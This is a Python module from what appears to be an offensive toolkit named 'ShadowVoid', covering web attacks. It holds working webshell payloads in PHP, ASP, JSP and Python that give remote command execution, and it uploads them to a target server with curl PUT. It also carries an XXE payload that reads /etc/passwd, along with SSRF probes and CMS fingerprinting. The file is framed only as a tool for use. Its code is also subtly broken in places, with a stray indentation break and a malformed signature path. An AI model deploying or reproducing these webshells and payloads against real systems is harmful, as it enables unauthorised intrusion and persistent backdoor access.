"""
ShadowVoid Web Module
Webshells, CMS scanners, SSRF/XXE automation
"""

import sys
import os
import time
import json
import subprocess
import socket
from datetime import datetime


class WebModule:
    def __init__(self, core):
        self.core = core

    def deploy_webshell(self, target, url_path, shell_type='php'):
        result = {
            'status': 'starting',
            'target': target,
            'url': url_path,
            'type': shell_type,
            'timestamp': datetime.now().isoformat()
        }
        try:
            shells = {
                'php': '<?php echo shell_exec($_GET["cmd"]); ?>',
                'asp': '<% Response.Write(Server.CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>',
                'jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                'python': 'import os; print(os.popen(request.args.get("cmd")).read())'
            }
            shell_code = shells.get(shell_type, shells['php'])
            upload_url = 'http://' + target + url_path
            cmd = ['curl', '-X', 'PUT', '--data-binary', shell_code, upload_url]
            output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=30)
            result['status'] = 'success'
            result['message'] = 'Webshell deployed'
            result['url'] = upload_url
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        return result

    def ssrf_test(self, target, url):
        result = {
            'status': 'starting',
            'target': target,
            'url': url,
            'timestamp': datetime.now().isoformat()
        }
        try:
            test_urls = [
                'http://' + target + '/?url=' + url,
                'http://' + target + '/proxy?url=' + url,
                'http://' + target + '/fetch?url=' + url
            ]
            for test_url in test_urls:
                try:
     

               response = subprocess.check_output(['curl', '-s', '-I', test_url],
                                                     stderr=subprocess.DEVNULL, timeout=10).decode()
                    if '200' in response:
                        result['status'] = 'vulnerable'
                        result['vulnerable_url'] = test_url
                        break
                except:
                    continue
            if result['status'] != 'vulnerable':
                result['status'] = 'not_vulnerable'
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        return result

    def xxe_test(self, target, endpoint):
        result = {
            'status': 'starting',
            'target': target,
            'endpoint': endpoint,
            'timestamp': datetime.now().isoformat()
        }
        try:
            xxe_payload = '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo>&xxe;</foo>'
            cmd = ['curl', '-X', 'POST', '-H', 'Content-Type: application/xml',
                   '--data-binary', xxe_payload, 'http://' + target + endpoint]
            output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=10)
            output_str = output.decode()
            if 'root:' in output_str or '/etc/passwd' in output_str:
                result['status'] = 'vulnerable'
                result['output'] = output_str
            else:
                result['status'] = 'not_vulnerable'
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        return result

    def cms_scan(self, target):
        result = {
            'status': 'starting',
            'target': target,
            'cms': [],
            'vulnerabilities': [],
            'timestamp': datetime.now().isoformat()
        }
        try:
            cms_signatures = {
                'WordPress': ['/wp-includes//wp-content/', '/wp-login.php'],
                'Joomla': ['/administrator/', '/media/system/js/', '/templates/'],
                'Drupal': ['/misc/drupal.js', '/sites/default/', '/core/']
            }
            for cms, signatures in cms_signatures.items():
                for sig in signatures:
                    try:
                        url = 'http://' + target + sig
                        response = subprocess.check_output(['curl', '-s', '-I', url],
                                                         stderr=subprocess.DEVNULL, timeout=5)
                        if b'200' in response:
                            result['cms'].append(cms)
                            break
                    except:
                        pass
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        return result
